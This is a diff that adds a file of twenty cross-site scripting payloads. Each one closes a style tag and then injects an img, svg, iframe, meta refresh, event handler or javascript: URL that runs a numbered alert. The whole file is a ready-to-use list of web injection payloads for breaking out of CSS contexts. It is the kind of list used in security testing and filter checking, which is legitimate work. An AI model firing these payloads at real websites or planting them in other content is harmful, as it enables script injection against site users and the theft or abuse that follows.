@@ -1,0 +1,20 @@
+</style><img src="x" onerror="alert('XSS1')">
+</style><svg onload="alert('XSS2')">
+</style><body onload="alert('XSS3')">
+</style><iframe src="javascript:alert('XSS4')"></iframe>
+</style><div style="background-image: url('javascript:alert('XSS5')')">
+</style><a href="javascript:alert('XSS6')">Click me</a>
+</style><input type="text" value="<script>alert('XSS7')</script>">
+</style><link rel="stylesheet" href="data:text/css;base64,body{background:url('javascript:alert('XSS8')')}">
+</style><object data="javascript:alert('XSS9')"></object>
+</style><embed src="javascript:alert('XSS10')">
+</style><form action="javascript:alert('XSS11')"><input type="submit"></form>
+</style><meta http-equiv="refresh" content="0;url=javascript:alert('XSS12')">
+</style><table background="javascript:alert('XSS13')"></table>
+</style><video><source onerror="alert('XSS14')"></video>
+</style><audio src="javascript:alert('XSS15')"></audio>
+</style><details open ontoggle="alert('XSS16')"></details>
+</style><marquee onstart="alert('XSS17')">XSS</marquee>
+</style><button onclick="alert('XSS18')">Click me</button>
+</style><div style="background: url('javascript:alert('XSS19')')">
+</style><textarea onfocus="alert('XSS20')"></textarea>
